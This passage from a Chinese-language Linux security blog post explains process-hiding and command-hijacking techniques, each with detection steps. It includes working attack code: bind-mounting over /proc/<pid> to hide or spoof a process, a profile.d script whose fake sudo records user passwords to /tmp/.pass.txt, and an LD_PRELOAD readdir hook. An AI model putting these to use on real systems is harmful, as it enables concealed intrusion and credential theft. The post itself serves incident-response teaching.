+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">    comm</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">$(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">cat</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$pid</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/comm</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> 2></span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/dev/null</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">    cmdline</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">$(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">cat</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$pid</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/cmdline</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> 2></span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/dev/null</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> tr</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">\0</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> [</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> -n</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$comm</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> ]</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> &#x26;&#x26;</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> [</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> -n</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$cmdline</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> ];</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> then</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> [[</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$cmdline</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> !=</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> *</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$comm</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">*</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> ]];</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> then</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">            echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">[!] PID: </span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$pid</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">            echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">    comm:    </span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$comm</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">            echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">    cmdline: </span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$cmdline</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">            echo</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        fi</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    fi</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">done</span></span></code></pre>
+<p>在排查网络的时候，也可以通过活跃连接源与目的端口去判定，以实际SSH业务为例，对于服务器而言，通常服务端口是一个固定的监听端口，默认为22，特殊情况可能为非标准端口，但在排查网络外联的时候服务端在活跃连接的源端口不是系统设置的，那么就可以确定为可疑，并且这类可以很明显的确定他是主动发起的请求，而不是外部发过来。
+<img src="https://static.synex.space/images/2026/10/02/678dabcb5c28-Pasted-image-20260908131802.png" alt="">
+此外，如果有其他情报，也可以直接通过内存搜索的方式去确定问题。</p>
+<h2 id="进程绑定挂载">进程绑定挂载</h2>
+<h3 id="攻击原理-1">攻击原理</h3>
+<p>攻击者利用 bind mount 替换目标进程的 <code>/proc/&#x3C;pid></code> 视图，使依赖 procfs 获取进程信息的工具（如 <code>ps</code>、<code>top</code> 等）读取到伪造或空白内容，从而达到隐藏或伪装进程信息的目的。</p>
+<h3 id="实现方案-1">实现方案</h3>
+<p>通过查看网络外联的形式，在正常情况下展示一下信息
+<img src="https://static.synex.space/images/2026/10/02/b2edd5e16498-Pasted-image-20260908105741.png" alt="">
+可以通过下面命令实现隐藏目的</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">mkdir</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -p</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /home/.hidden</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">mount</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -o</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> bind</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /home/.hidden</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc/9289</span></span></code></pre>
+<p>隐藏后通过排查网络外联的形式查看，可以发现PID信息已被隐藏，且直接通过ps无法找到进程信息
+<img src="https://static.synex.space/images/2026/10/02/ac5f79e1af44-Pasted-image-20260908110152.png" alt="">
+消失的原因是部分用户态工具（如<code>ps</code>、<code>top</code> 以及依赖 <code>procfs</code> 的工具）通过读取 <code>/proc/&#x3C;pid></code> 下的文件获取进程信息。通过 bind mount 将目标进程的 <code>/proc/&#x3C;pid></code> 目录覆盖到其他目录后，工具访问该 PID 对应路径时会被重定向到挂载后的内容。如果绑定目标是一个空目录，例如 <code>/home/.hidden</code>，由于缺少 cmdline、status、fd 等 proc 文件，依赖这些信息的工具无法获取完整进程信息，因此可能无法显示该进程。
+另一种利用方式是不创建新的目录，而是将目标 PID 的 <code>/proc</code> 目录绑定到另一个已经存在的进程，例如 /proc/1 或其他正常进程。此时工具获取到的是伪造进程信息，实现进程信息欺骗，而不是简单隐藏，但是这个针对<code>netstat</code>无效，它并不是完全依赖<code>/procfs</code>。</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">mount</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -o</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> bind</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc/1</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc/9289</span></span></code></pre>
+<h3 id="排查方案-1">排查方案</h3>
+<p>快速发现异常的手段可以执行下面命令</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">mount</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">grep</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc/</span></span></code></pre>
+<p>但是这个命令只能用来发现异常，回显的信息没有对应绑定路径。
+<img src="https://static.synex.space/images/2026/10/02/6a7426ed95c4-Pasted-image-20260908112524.png" alt="">
+较为详细的内容可以通过下面命令执行发现</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">cat</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc/self/mountinfo</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">grep</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc/</span></span></code></pre>
+<p><img src="https://static.synex.space/images/2026/10/02/3e5caa5e9de3-Pasted-image-20260908112619.png" alt="">
+也可以通过下面命令发现可疑进程(如果隐匿的方式是进程绑定进程则无效,仅辅助使用)</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">ls</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -l</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> awk</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">$5 != 0</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span></span></code></pre>
+<p><img src="https://static.synex.space/images/2026/10/02/edc863763b8b-Pasted-image-20260908113103.png" alt="">
+排查确定有问题取证完毕后，可以通过下面命令进行恢复进程状态</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">umount</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc/9289</span></span></code></pre>
+<h2 id="命令劫持">命令劫持</h2>
+<h3 id="攻击原理-2">攻击原理</h3>
+<p>攻击者通过修改 Shell 启动配置文件，在系统加载用户环境时定义与系统命令同名的函数或脚本，从而优先执行恶意逻辑，实现对常用命令的劫持。由于 Shell 会优先匹配函数和别名，用户执行命令时可能无法直接调用原始程序。</p>
+<h3 id="实现方案-2">实现方案</h3>
+<p>在<code>/etc/profile.d/</code>目录下创建<code>pass_hijack.sh</code>，写入以下内容：</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#EA76CB;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA">function</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> ls</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">    out</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">$(</span><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">command</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> ls</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#D7DBE0;--shiki-dark-font-style:inherit">$@</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">    out</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">$(</span><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$out</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> sed</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -e</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/pass_hijack\.sh/d</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">    echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$out</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-dark:#C792EA">function</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> sudo</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">    read</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -sp</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">[sudo] password for </span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$USER</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">: </span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> password</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">    echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> ""</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">    touch</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /tmp/.pass.txt</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> 2></span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/dev/null</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">    echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$USER</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> : </span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$password</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> >></span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /tmp/.pass.txt</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">    echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$password</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> /usr/bin/sudo</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -S</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#D7DBE0;--shiki-dark-font-style:inherit">$@</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span></code></pre>
+<p>其中，ls函数通过<code>command ls</code>调用原始命令，并过滤结果中的<code>pass_hijack.sh</code>，以隐藏恶意脚本自身。sudo函数则伪造密码提示，记录用户输入的密码后，再调用真实的sudo命令继续执行操作。修改后可以通过<code>source /etc/profile</code>重新加载配置文件，使其生效，需要注意的是，默认用户登录都会自动去加载一遍这个配置，不需要手动去执行即可生效。生效结果如下
+<img src="https://static.synex.space/images/2026/10/02/be39ece0390b-Pasted-image-20260913151453.png" alt="">
+除窃取密码外，攻击者还可以在被劫持的命令中加入恶意软件持久化、反向 Shell、敏感信息收集及外传等逻辑，从而扩大攻击影响。</p>
+<h3 id="排查方案-2">排查方案</h3>
+<p>在本文的实现方案中，加载后可以明显的看到<code>ls</code>命令的输出方式变了，正常来说<code>ls</code>命令的输出方式应该是自适应的，比较短的文件通常都会是横向输排列的，这个也算是一个可以发现问题的点。针对普通场景下的排查，可以查看<code>/etc/profile</code>和<code>/etc/profile.d/*</code>中是否存在可疑的命令来确定问题。如果文件较多也可以尝试通过追踪系统调用的方式去发现，但是追踪系统调用的方式你需要明确了解被劫持的命令，这个似乎在实际环境中并不好发现，命令为<code>strace -e trace=file -f ls /etc/profile.d/</code>，执行结果如下
+<img src="https://static.synex.space/images/2026/10/02/5a77efa1f399-Pasted-image-20260913152745.png" alt="">
+需要注意，<code>/etc/profile</code>、<code>/etc/profile.d/</code>只是比较常见的配置位置，并不是固定位置。攻击者也可以通过<code>~/.bashrc</code>、<code>/etc/bash.bashrc</code>等文件加载恶意内容，或者在这些文件中指定其他目录及独立文件。因此，需要结合实际 Shell 类型和启动流程，对相关配置文件及其引用内容进行分析。
+<img src="https://static.synex.space/images/2026/10/02/4a43ba39c15b-Pasted-image-20260913152943.png" alt=""></p>
+<h2 id="动态链接库劫持">动态链接库劫持</h2>
+<h3 id="攻击原理-3">攻击原理</h3>
+<p>攻击者利用 Linux 动态链接器加载机制，通过 LD_PRELOAD 指定恶意共享库，使目标程序在启动时优先加载攻击者控制的代码，从而实现函数劫持、行为修改或隐藏攻击痕迹。</p>
+<h3 id="实现方案-3">实现方案</h3>
+<p>参考项目文件:<a href="https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c">https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c</a>
+项目实际实现是通过 <code>LD_PRELOAD</code> 对 <code>libc</code> 的 <code>readdir</code> 函数进行 hook。当目标程序遍历 <code>/proc</code> 目录获取进程列表时，hook后的 readdir 会判断当前遍历目录是否为 <code>/proc</code>，并读取对应 PID 的进程名称。如果发现进程名称匹配需要隐藏的目标，则通过 continue 跳过该目录项，使调用方无法获取该进程信息，关键代码如下。</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="c"><code><span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">            if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">get_dir_name</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">dirp</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> dir_name</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> sizeof</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">dir_name</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">))</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> &#x26;&#x26;</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F78C6C">        \</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">                strcmp</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">dir_name</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/proc</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> ==</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> &#x26;&#x26;</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F78C6C">                       \</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">                get_process_name</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">dir</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">-</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">></span><span style="--shiki-light:#E64553;--shiki-light-font-style:italic;--shiki-dark:#D7DBE0;--shiki-dark-font-style:inherit">d_name</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> process_name</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> &#x26;&#x26;</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F78C6C">          \</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">                strcmp</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">process_name</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> process_to_filter</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> ==</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F78C6C">         \</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">                continue</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F78C6C">                                               \</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">            }</span><span style="--shiki-light:#EA76CB;--shiki-dark:#F78C6C">                                                           \</span></span></code></pre>
+<p>本地实现方案可以参考下面命令去构建动态链接库</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">curl</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -O</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic"> # 下载对应代码</span></span>
